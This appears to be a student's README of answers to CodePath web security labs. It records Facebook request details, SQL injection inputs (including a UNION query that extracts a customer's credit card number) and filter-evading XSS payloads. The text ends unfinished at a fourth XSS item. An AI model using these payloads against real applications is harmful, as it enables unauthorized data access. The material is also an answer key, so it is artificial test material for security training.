# Web-Securities-Labs
codepath Web Securities labs

## Week 1
Insecure Direct Object Reference:
1) Go to https://facebook.com. What is the Cache-Control header set to in the response? Enter as a comma-delimited list below. Order doesn't matter, and values are case insensitive. 
``` private, no-cache, no-store, must-revalidate ```

2) What is the URI for liking a Facebook post on your homepage? Hint: https://www.quora.com/What-does-Facebook-refer-to-as-UFI
``` /ufi/reaction/?dpr=1 ```

3) When posting your status to Facebook, which query parameter contains the text of your message? Hint: Make sure you're not filtering out URIs like: ajax/updatestatus 
``` xhpc_message_text ```

## Week 2
SQL injections:
1) To complete this challenge, you must exploit SQL injection flaw in the following form to find the result key.

Please enter the Customer Id of the user that you want to look up: 
``` SELECT * FROM customers WHERE customerId ="1" OR '1' = '1'; -- ";```

2) To complete this challenge, you must exploit the SQL injection flaw in the following form to find the result key.

Please enter the Customer Email of the user that you want to look up:
``` SELECT * FROM customers WHERE customerEmail ="samman@gmail.com' OR '1' = '1'; -- "@gmail.com ```

3) To complete this challenge, you must exploit SQL injection flaw in the following form to find the result key. The developer of this level has attempted to stop SQL Injection attacks by escaping apostrophes so the database interpreter will know not to pay attention to user submitted apostrophes.
```SELECT * FROM customers WHERE customerId ="2\' OR 1 = 1;-- "; ```

4) To complete this challenge, you must exploit a SQL injection issue in the following sub application to acquire the credit card number from one of the customers that has a customer name of Mary Martin. Mary's credit card number is the result key to this challenge.
``` SELECT customerName from customers where customerName='Mary MArtin' Union select CreditCardNumber from customers where customerName="mary martin"; # ```

## Week 3
Cross Site Scripting One

1) Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
Please enter the Search Term that you want to look up 
```<IMG SRC="#" ONERROR="alert('XSS')"/>```

2)  Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
Please enter the Search Term that you want to look up 
```<IMG SRC="#" ONMESSAGE="alert('XSS')"/>```

3) In this one, the developer is completely removing the handler name. 
``` <SCRonmessageIPT>alert('XSS')</SCRonmessageIPT>```

4) Huh
